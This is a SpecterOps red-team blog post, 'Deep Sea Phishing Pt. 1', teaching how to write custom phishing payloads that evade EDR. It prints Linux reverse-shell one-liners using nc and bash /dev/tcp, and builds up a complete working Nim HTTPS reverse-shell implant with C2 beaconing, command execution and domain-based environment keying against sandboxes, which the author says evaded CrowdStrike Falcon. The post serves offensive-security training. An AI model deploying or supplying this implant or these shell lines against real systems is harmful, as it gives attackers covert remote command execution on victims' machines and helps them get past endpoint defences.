# https://posts.specterops.io/deep-sea-phishing-pt-1-092a0637e2fd

![Revisit consent button](https://cdn-cookieyes.com/assets/images/revisit.svg)

We value your privacy

We use cookies to enhance your browsing experience, serve personalized ads or content, and analyze our traffic. By clicking "Accept All", you consent to our use of cookies.

CustomizeReject AllAccept All

Customize Consent Preferences![Close](https://cdn-cookieyes.com/assets/images/close.svg)

NecessaryAlways Active

Necessary cookies are required to enable the basic features of this site, such as providing secure log-in or adjusting your consent preferences. These cookies do not store any personally identifiable data.

- Cookie

\_cfuvid

- Duration

session

- Description

Calendly sets this cookie to track users across sessions to optimize user experience by maintaining session consistency and providing personalized services


- Cookie

\_GRECAPTCHA

- Duration

6 months

- Description

Google Recaptcha service sets this cookie to identify bots to protect the website against malicious spam attacks.


- Cookie

cookieyes-consent

- Duration

1 year

- Description

CookieYes sets this cookie to remember users' consent preferences so that their preferences are respected on subsequent visits to this site. It does not collect or store any personal information about the site visitors.


Functional

Functional cookies help perform certain functionalities like sharing the content of the website on social media platforms, collecting feedback, and other third-party features.

- Cookie

li\_gc

- Duration

6 months

- Description

Linkedin set this cookie for storing visitor's consent regarding using cookies for non-essential purposes.


- Cookie

lidc

- Duration

1 day

- Description

LinkedIn sets the lidc cookie to facilitate data center selection.


- Cookie

yt-remote-device-id

- Duration

Never Expires

- Description

YouTube sets this cookie to store the user's video preferences using embedded YouTube videos.


- Cookie

ytidb::LAST\_RESULT\_ENTRY\_KEY

- Duration

Never Expires

- Description

The cookie ytidb::LAST\_RESULT\_ENTRY\_KEY is used by YouTube to store the last search result entry that was clicked by the user. This information is used to improve the user experience by providing more relevant search results in the future.


- Cookie

yt-remote-connected-devices

- Duration

Never Expires

- Description

YouTube sets this cookie to store the user's video preferences using embedded YouTube videos.


- Cookie

yt-remote-session-app

- Duration

session

- Description

The yt-remote-session-app cookie is used by YouTube to store user preferences and information about the interface of the embedded YouTube video player.


- Cookie

yt-remote-cast-installed

- Duration

session

- Description

The yt-remote-cast-installed cookie is used to store the user's video player preferences using embedded YouTube video.


- Cookie

yt-remote-session-name

- Duration

session

- Description

The yt-remote-session-name cookie is used by YouTube to store the user's video player preferences using embedded YouTube video.


- Cookie

yt-remote-fast-check-period

- Duration

session

- Description

The yt-remote-fast-check-period cookie is used by YouTube to store the user's video player preferences for embedded YouTube videos.


Analytics

Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics such as the number of visitors, bounce rate, traffic source, etc.

- Cookie

pardot

- Duration

past

- Description

The pardot cookie is set while the visitor is logged in as a Pardot user. The cookie indicates an active session and is not used for tracking.


- Cookie

ajs\_anonymous\_id

- Duration

1 year

- Description

This cookie is set by Segment to count the number of people who visit a certain site by tracking if they have visited before.


- Cookie

ajs\_user\_id

- Duration

Never Expires

- Description

This cookie is set by Segment to help track visitor usage, events, target marketing, and also measure application performance and stability.


- Cookie

uid

- Duration

1 year 1 month 4 days

- Description

This is a Google UserID cookie that tracks users across various website segments.


- Cookie

sid

- Duration

1 year 1 month 4 days

- Description

The sid cookie contains digitally signed and encrypted records of a user’s Google account ID and most recent sign-in time.


- Cookie

\_ga

- Duration

1 year 1 month 4 days

- Description

Google Analytics sets this cookie to calculate visitor, session and campaign data and track site usage for the site's analytics report. The cookie stores information anonymously and assigns a randomly generated number to recognise unique visitors.


- Cookie

\_ga\_\*

- Duration

1 year 1 month 4 days

- Description

Google Analytics sets this cookie to store and count page views.


- Cookie

\_gcl\_au

- Duration

3 months

- Description

Google Tag Manager sets the cookie to experiment advertisement efficiency of websites using their services.


Performance

Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.

No cookies to display.

Advertisement

Advertisement cookies are used to provide visitors with customized advertisements based on the pages you visited previously and to analyze the effectiveness of the ad campaigns.

- Cookie

bcookie

- Duration

1 year

- Description

LinkedIn sets this cookie from LinkedIn share buttons and ad tags to recognize browser IDs.


- Cookie

visitor\_id\*

- Duration

1 year 1 month 4 days

- Description

Pardot sets this cookie to store a unique user ID.


- Cookie

visitor\_id\*-hash

- Duration

1 year 1 month 4 days

- Description

Pardot sets this cookie to store a unique user ID.


- Cookie

YSC

- Duration

session

- Description

Youtube sets this cookie to track the views of embedded videos on Youtube pages.


- Cookie

VISITOR\_INFO1\_LIVE

- Duration

6 months

- Description

YouTube sets this cookie to measure bandwidth, determining whether the user gets the new or old player interface.


- Cookie

VISITOR\_PRIVACY\_METADATA

- Duration

6 months

- Description

YouTube sets this cookie to store the user's cookie consent state for the current domain.


- Cookie

yt.innertube::requests

- Duration

Never Expires

- Description

YouTube sets this cookie to register a unique ID to store data on what videos from YouTube the user has seen.


- Cookie

yt.innertube::nextId

- Duration

Never Expires

- Description

YouTube sets this cookie to register a unique ID to store data on what videos from YouTube the user has seen.


Uncategorised

Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.

- Cookie

\_zitok

- Duration

1 year

- Description

Description is currently not available.


- Cookie

lpv603731

- Duration

1 hour

- Description

Description is currently not available.


- Cookie

\_\_Secure-ROLLOUT\_TOKEN

- Duration

6 months

- Description

Description is currently not available.


Reject All  Save My Preferences  Accept All

Powered by [![Cookieyes logo](https://cdn-cookieyes.com/assets/images/poweredbtcky.svg)](https://www.cookieyes.com/product/cookie-consent/)

[Introducing BloodHound Scentry: Accelerate your APM practice. Learn More](https://specterops.io/bloodhoundscentry/)

[Back to Blog](https://specterops.io/blog)

[Research & Tradecraft](https://specterops.io/blog/category/research/)

Deep Sea Phishing Pt. 1

Author

[Forrest Kasler](https://specterops.io/blog/author/forrest-kasler/)

Read Time

17 mins

Published

Jul 23, 2024

##### Share

#### PHISHING SCHOOL

#### How to Bypass EDR With Custom Payloads

If endpoint detection and response (EDR) protections keep blocking your phishing payloads, you really should learn how to write custom payloads. If you’ve never written a custom payload, this is a great place to start. If you have some experience with custom payloads, I hope I can at least simplify the way you think about payload design to make it easy and fun.

Yes, we are going to dive into some code. So get your favorite techno jams on, and follow my lead.

[https://www.youtube.com/watch?v=4ImBUTSJmRY](https://www.youtube.com/watch?v=4ImBUTSJmRY)

![](https://cdn-images-1.medium.com/max/245/0*r1YLJDIT4G3rs0go)We made ours with a special rabbit ear on top so we could pipe in some music

### **Why Custom Payloads are (Usually) Better Than Stock Shellcode**

Say it with me: **“Known Bad”**. That’s the reason your payloads are getting caught. Your payload is doing something bad and the EDR knows it because it’s seen your tricks before. More importantly, it probably saw the exact same payload before, just with a different name and maybe a few other small changes.

In order to block malware, you have to know what malware _looks_ like. To do that, the best information EDR engineers can go off of is a large collection of malware samples. These samples come from malware that’s been “caught in the wild”. Most of these known bad samples come straight out of popular command and control (C2) frameworks like Metasploit, Cobalt Strike, Empire, Mythic, etc. so if you are using payloads that any of those frameworks generate, then chances are that EDR products have already seen payloads that look like yours.

One major problem for red teams is the way in which C2 frameworks generate payloads. Almost always, there is a payload template that is then filled out with some common parameters like LHOST and LPORT, and then (hopefully) obfuscated and compiled. Some variable names and values may have changed, but the overall structure of the final payload will be extremely similar across builds. That’s what leads to signatures of these “known bads.”

You might be surprised by how simple some of these signatures tend to be. There are some great examples in MDSec’s blog series “How I Met Your Beacon”. For instance, the string “bruteloader” sitting around in memory, along with some other easily searchable strings, on older versions of Brute Ratel:

[https://www.mdsec.co.uk/2022/08/part-3-how-i-met-your-beacon-brute-ratel/](https://www.mdsec.co.uk/2022/08/part-3-how-i-met-your-beacon-brute-ratel/)

We don’t know what parts of our preferred C2 payload might already be signatured or may become signatured in the near future, so we will need to write our own payloads to stay off the “known bad” list. Unless you happen to write your payload the exact same way as someone else (doubtful), your payload will have a good chance of being on the highly desirable “unknown bad” list.

### **Custom Payloads: Shellcode Loaders vs. Implants**

One noteworthy approach to writing custom payloads is to just implement your own shellcode loader and use it to load shellcode from your preferred C2. That way, you don’t have to write the actual beaconing malware, or what we’ll call an “implant”. If your custom shellcode loader bypasses an EDR, then you can just use all the pre-built features of your favorite implant from your favorite C2 framework. However, there are two major hurdles you will face with this approach:

1. You are loading shellcode: a highly signatured and sketchy activity
2. You are loading a “known bad” into memory

You don’t run shellcode the same way you run a normal executable. That’s why we have to use funky stuff like [reflective loaders](https://www.netspi.com/blog/technical-blog/adversary-simulation/srdi-shellcode-reflective-dll-injection/) and [Windows thread pool injection](https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/). Ultimately, you need to find some way to allocate some memory in a process, copy in your shellcode, and drop a thread on it. There are only a handful of ways to achieve each of those steps, so your options are somewhat limited, and EDR products tend to keep a close watch on the functions you’ll need to use. Jared Atkinson wrote a great blog on this subject that you can reference [here](https://medium.com/specter-ops-posts/on-detection-from-tactical-to-functional-1349e51e1a03), but suffice to say that EDRs have put a massive amount of effort into detecting shellcode loading as an anomalous behavior.

Even if your shellcode loader works just fine, and the EDR doesn’t detect the loader itself, the shellcode you load might still get caught. At some point, your shellcode loader passes off execution to the shellcode. If that shellcode is an implant for a popular C2 framework like Cobalt Strike (CS), there will still be multiple indicators that an EDR can use to determine that there is now a CS Beacon running in memory. This leads to the need for [sleep masks](https://codex-7.gitbook.io/codexs-terminal-window/red-team/red-team-dev/loader-dev/sleep-masking) and using a range of memory shenanigans to hide the final implant.

Despite these two major challenges, this seems to be the leading approach for most serious red teams these days. We would rather spend development time finding ways to sneak “known bads” into the environment than writing our own implants from scratch. For one, it’s nice to operate from a \*\*\* _insert your favorite shell here\*\*\*_ shell because it already has all the post-exploitation features we need. Additionally, there is a fear that if we develop our own implant, and it gets caught, that we will have to start all over again.

However, custom implants come with one major benefit: they are likely to be an “unknown bad”. When trying to bypass EDR, that’s an extremely valuable upside and one that I think red teams often discount. In addition, I don’t think that custom payload development needs to be all that time consuming. In a moment, I will show you a reverse shell I wrote in less than an hour that was able to bypass Crowdstrike Falcon and remained undetected on multiple hosts for the duration of a week-long assessment. But first, we need to cover some reverse shell first principles.

### **Why So Sketchy?**

Is it really just as easy as writing your own implant to be an “unknown bad”? Let’s think about this. At their core, remote access implants do two things:

1. Call home to a server for instructions
2. Run some custom logic in the form of post-exploitation modules

First off, tons of legitimate programs make connections out to the internet. They get data from an API, or ship user metrics, or check for updates on a regular basis. Secondly, every program runs custom logic; that’s the whole point of writing programs. So, if we can keep our implants as close to the bare minimum requirements as possible, they really shouldn’t stand out all that much.

### **The Minimal Shell**

![](https://cdn-images-1.medium.com/max/400/0*d3VzsoyxzynoLGDX)

At a minimum, a reverse shell needs to be able to receive instructions (i.e., commands) from our server, and execute those instructions/commands. That’s it; that is C2 at its core. Ideally, if there is output from a command, then we are going to want to get a copy of that output as well. Here’s some wonderful examples from the world of Linux:

```
nc -e /bin/sh 10.0.0.1 8080
```

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

In each case, we see TCP is being used to get data in and out and Bash is used to execute incoming data as instructions. Unfortunately, things are a little more complicated on Windows. We can’t just connect to a remote TCP port with a simple one-liner, so we will need to write a little logic to do the “instructions in”/“output out” bit. We might also want to use a protocol that is frequently allowed outbound like HTTP(S). Here’s an example minimal shell written in Nim (Medium doesn’t have a ‘Nim’ code block, so Dart will have to be close enough in syntax. Sorry it’s not very pretty):

```
import std/strformat
import puppy
import std/strutils
import osproc

var server = "https://myc2server.com/"

proc getTask(): string =
    var task = fetch(server)
    return task

proc taskIO*(data: string): string =
    return post(
        server,
        @[("Content-Type", "text/plain")],
        data
    ).body

while true:
    var newTask: string = getTask()
    if newTask.len > 0:
        var taskResult: string = exec_cmd_ex(newTask).output
        discard taskIO(taskResult)
    sleep(10000)
```

The main execution loop of this shell is under the “while true” block. The implant checks the server for a new instruction, executes it as an operating system (OS) command, sends back any output, and then repeats the process every 10 seconds. This is a working reverse HTTPS shell.

Note, I have broken out the steps for receiving instructions and sending back output into their own functions called “getTask” and “taskIO”. **This is very important for making the code modular and extensible!**

For example, what if I wanted to receive instructions over HTTPS but send back output over DNS? I could change the code inside the taskIO function to do that, and as long as the function name and signature stay the same (i.e., it takes one string argument and returns a string), then other parts of the code don’t have to change. The execution block doesn’t need to know how instructions are received from or sent to the server; only that it will get an instruction by calling getTask() and then call taskIO with the result. I can completely change the inner workings of getTask or taskIO without needing to modify the main execution loop.

Our implant now chains 4 tasks together, with the code for each task broken out in a modular way:

Get Instruction → Execute Instruction → Send Output → Loop

### **Multiplayer Mode**

![](https://cdn-images-1.medium.com/max/764/0*X8Mkif9_WW0tiBJO)

Our example shell _works_, but it’s got several glaring flaws we need to address before even considering using it on a phishing expedition. For one, we have no way to uniquely identify each shell that calls home. They will all receive the same command from the server and then all send back their outputs at the same time. This is super annoying and not very useful if you happen to score multiple shells. To fix this, we just need to calculate a random identifier for each shell:

```
proc rndStr: string =
    for _ in .. 5:
        add(result, char(rand(int('a') .. int('z'))))
```

We can then add the identifier to our requests when the implant talks to the server:

```

var implantId = fmt("{rndStr()}")

proc getTask(): string =
    var task = fetch(server & "?id=" & implantId)
    return task

proc taskIO*(data: string): string =
    return post(
        server & "?id=" & implantId,
        @[("Content-Type", "text/plain")],
        data
    ).body
```

**Protect Your (Client’s) Data!**

![](https://cdn-images-1.medium.com/max/500/0*eAzi5yt4dFtHJT7S)

**WARNING: Do not use encoding to “protect” data. Use encryption. Encoding != Encrypting. I use encoding in this section for example purposes only. Don’t use this code on an operation!**

In practice, we should always take precautions to protect data in transit between our implants and our C2 server. Relying on HTTPS alone is not sufficient because we may wind up on a network that is utilizing TLS inspection. You can use shared key encryption (e.g., AES) or public key encryption (e.g., RSA or elliptic-curve cryptography), or even get fancy with a key exchange to ensure [forward secrecy](https://en.wikipedia.org/wiki/Forward_secrecy). Whatever you use, just make sure that it uses proper encryption to secure the data in transit.

For sake of example, I am about to do the opposite. I will be using Base64 as a stand in for encryption because it is simple and has both an encode and decode function. I frequently use this trick to stub encryption logic during development without adding a bunch of complexity. Once the shell is working, I swap out the crypto last. As mentioned earlier, if we separate out these components into simple functions, we can change their implementation later without needing to modify the whole implant. Here’s the relevant changes:

```
import std/base64

proc enc*(data: string): string =
    return encode(data)

proc dec*(data: string): string =
    return decode(data)

proc getTask(): string =
    var encTask = fetch(server & "?id=" & implantId)
    return dec(encTask)

proc taskIO*(data: string): string =
    var encData = enc(data)
    return post(
        server & "?id=" & implantId,
        @[("Content-Type", "text/plain")],
        encData
    ).body
```

Once again, note that we did not have to change any part of the main execution loop. With these changes in place, we can also swap out the implementation of the “enc” and “dec” functions to use actual cryptography without needing to change any other implant code.

Here’s the flow of our implant now:

Get Instruction → Decrypt Instruction → Execute Instruction → Encrypt Output → Send Output → Loop

Once you swap out the “enc” and “dec” functions with real encryption, this reverse shell would work just fine for some basic post-exploitation tasks. You might use a shell like this to stage a more feature rich shell or as a proof-of-concept of successfully breaching the network perimeter. Of course, we can do better.

**Protect Your Implant!**

![](https://cdn-images-1.medium.com/max/500/0*V14kZkPic0WYcTVN)

In practice, we should also add some environment keying to make sure our implant dies if it is run on an unintended target. The benefit here is two-fold. First, our implant will exit early if an EDR product tries to run it in a sandbox environment. Second, we limit the possibility of collateral damage if our target users share the payload with someone outside the organization (forward to a spouse, etc.). Here is a very basic example to add to our code:

```
import std/md5
import std/os

proc envKey(): string =
    var dom = getEnv("USERDOMAIN")
    var md5hash = getMD5(dom)
    if (md5hash == "f57d933f230d99eff5ca9d87b874bf46"):
        return "https://myc2domain.com/"
    else:
        quit("Missing dependency")

var server = envKey()
```

This simple protection will make sure our implant will only execute properly when run on a host joined to the “example.local” domain. To take this a step further, you could actually use a key derived from the domain to encrypt the server URL. That way it would be more difficult to reverse engineer.

**Making Our Implant Do More**

![](https://cdn-images-1.medium.com/max/400/0*ujMjuXIQcdVeLjUC)

I’ll admit, this implant is not going to be all that useful or stealthy in its current state. It’s going to spawn a new process for every command that you run and those parent-child process relations alone might get us busted. We are also limited to using built-in Windows commands. However, note that with our modular design we could easily change that. What if instead, we modified the logic to expect a PowerShell script as its instructions? Suddenly, our implant would be able to run all of the post-exploitation modules from [Empire](https://github.com/mishmashclone/BC-SECURITY-Empire). Or what if we modify our execution loop to expect an encoded .NET assembly? Then we could feed it tradecraft from frameworks like [Covenant](https://github.com/cobbr/Covenant). Either option should be more than sufficient for most post-exploitation needs.

One thing I would avoid, especially for initial access payloads, is adding too much functionality. This is a slippery slope that I have seen many developers fall down. They build a basic implant like the one I’ve demonstrated in this blog, but then think, “I should add file upload/download” and then, some time later, “I want it to take screenshots.” Before you know it, the implant code is a big fat mess rife with case switch statements.

All of this added functionality comes with a big cost: telemetry, and not the good kind. I mean the kind that EDRs can use to hunt you down. Every feature introduces potential indicators that might become signatured. I’ve learned this the hard way when one of my favorite custom implants was being blocked based on the screen capture logic I had added as a default command. Did I _need_ screen captures to perform post-exploitation? NO! I ruined a perfectly good implant by over complicating it!

Instead, I think single-purpose implants are the best way to go for initial access. Note, that our implant doesn’t have to do any argument parsing. It just expects the data that comes from the getTask() function call to be fully packed instructions that it can just execute and return the results. That’s the way I like it! If I were to modify this implant to run PowerShell scripts, I would make sure that the C2 server appends a call to the post-exploitation module with populated parameters alongside the module’s code. That way, the implant doesn’t have to do any argument parsing and can remain as simple as possible. Whenever I can, I prefer to push complexity to the C2 server and away from the implants.

**Putting It All Together**

![](https://cdn-images-1.medium.com/max/400/0*SUjbx5ACJOtmAQQe)

As mentioned earlier, I recently wrote a reverse shell that was able to bypass CrowdStrike on an assessment. We have actually reconstructed almost the exact same shell in this blog. For this particular assessment, the goal was not to take over the network, but to simply mimic initial access and C2 traffic from a sample of endpoints. Therefore, I didn’t need to bring a bunch of post-exploitation tradecraft. I didn’t even need to worry about encryption because I was not going to be exfiltrating any sensitive data. I just needed a beaconing reverse shell to maintain internal access. Here is the final shell in its entirety:

```
#Dependencies Section
import std/strformat
import puppy
import std/strutils
import osproc
import std/base64
import std/md5
import std/os

#Environment Keying Section
proc envKey(): string =
    var dom = getEnv("USERDOMAIN")
    var md5hash = getMD5(dom)
    if (md5hash == "f57d933f230d99eff5ca9d87b874bf46"):
        return "https://myc2domain.com/"
    else:
        quit("Missing dependency")

var server = envKey()

#Encryption Section
proc enc*(data: string): string =
    return encode(data)

proc dec*(data: string): string =
    return decode(data)

#Data In/Out Section
proc rndStr: string =
    for _ in .. 5:
        add(result, char(rand(int('a') .. int('z'))))

var implantId = fmt("{rndStr()}")

proc getTask(): string =
    var encTask = fetch(server & "?id=" & implantId)
    return dec(encTask)

proc taskIO*(data: string): string =
    var encData = enc(data)
    return post(
        server & "?id=" & implantId,
        @[("Content-Type", "text/plain")],
        encData
    ).body

#Execution Block
while true:
    var newTask: string = getTask()
    if newTask.len > 0:
        var taskResult: string = exec_cmd_ex(newTask).output
        discard taskIO(taskResult)
    sleep(10000)
```

Even with comments and some extra lines for visual spacing, this puppy weighs in at just 53 lines of code; most of which chatGPT could generate for you in minutes. And the best part is it works! That’s all I needed it to do and it flew under the radar like a champ. The second best part is that, with very little additional effort, I could turn this into a much more feature rich implant. Simply swapping the execution loop to expect PowerShell scripts, or .Net assemblies, or Beacon object files (BOFs) as instructions instead of OS commands would open a wide range of post-exploitation capabilities. I could also swap out the “enc” and “dec” functions to implement actual cryptography so that I could use it on “real” operations.

**In Conclusion**

If you are struggling to bypass endpoint defenses with your initial access payloads, I would highly recommend writing a custom implant. It doesn’t have to be fancy and, in fact, I think the simpler the better when it comes to initial access payloads. I’ve written many tiny implants that have been able to bypass sophisticated EDR products because they are simple and “unknown bad.” If you take me up on the challenge, I encourage you to keep it modular; that way you can modify or expand the logic as needed. Finally, remember that you don’t always need to bring a tank to a knife fight. A small gun may be all you need to get the job done.

![](https://cdn-images-1.medium.com/max/500/0*kcCpXq-2SShNz25B)Feed the Phish

![](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=092a0637e2fd)

* * *

[Deep Sea Phishing Pt. 1](https://posts.specterops.io/deep-sea-phishing-pt-1-092a0637e2fd) was originally published in [Posts By SpecterOps Team Members](https://posts.specterops.io/) on Medium, where people are continuing the conversation by highlighting and responding to this story.

Post Views:611

Ready to get started?

[Book a Demo](https://specterops.io/get-a-demo/)

You might also be interested in

[![V8 Heap Archaeology: Finding Exploitation Artifacts in Chrome’s Memory](https://specterops.io/wp-content/uploads/sites/3/2026/01/Screenshot-2026-01-31-154306.png?w=300)\\
\\
Research & Tradecraft\\
\\
V8 Heap Archaeology: Finding Exploitation Artifacts in Chrome’s Memory\\
\\
TL;DR : This post aims to introduce readers to the anatomy and detection of JavaScript memory corruption exploits that target Google… \\
\\
By: \\
Liam D. \\
\\
17 mins](https://specterops.io/blog/2026/02/11/v8-heap-archaeology-finding-exploitation-artifacts-in-chromes-memory/)

[![Weaponizing Whitelists: An Azure Blob Storage Mythic C2 Profile](https://specterops.io/wp-content/uploads/sites/3/2026/01/Screenshot-2026-01-21-at-10.19.48-AM.png?w=300)\\
\\
Research & Tradecraft\\
\\
Weaponizing Whitelists: An Azure Blob Storage Mythic C2 Profile\\
\\
TL;DR: Mature enterprises lock down egress but often carve out broad exceptions for trusted cloud services. This post shows how… \\
\\
By: \\
Andrew Gomez, Allen DeMoura \\
\\
10 mins](https://specterops.io/blog/2026/01/30/weaponizing-whitelists-an-azure-blob-storage-mythic-c2-profile/)

[![Hacking Humans: Social Engineering and the Psychology](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_388eda.jpeg?w=300)\\
\\
Research & Tradecraft\\
\\
Hacking Humans: Social Engineering and the Psychology\\
\\
TL;DR : Social engineering engagements are the most exciting and heart pumping, “in my opinion”. It doesn’t begin at the… \\
\\
By: \\
John Wotton \\
\\
12 mins](https://specterops.io/blog/2026/01/23/hacking-humans-social-engineering-and-the-psychology/)

Notifications

![](<Base64-Image-Removed>)

[Previous image](https://specterops.io/blog/2024/07/23/deep-sea-phishing-pt-1/)[Next image](https://specterops.io/blog/2024/07/23/deep-sea-phishing-pt-1/)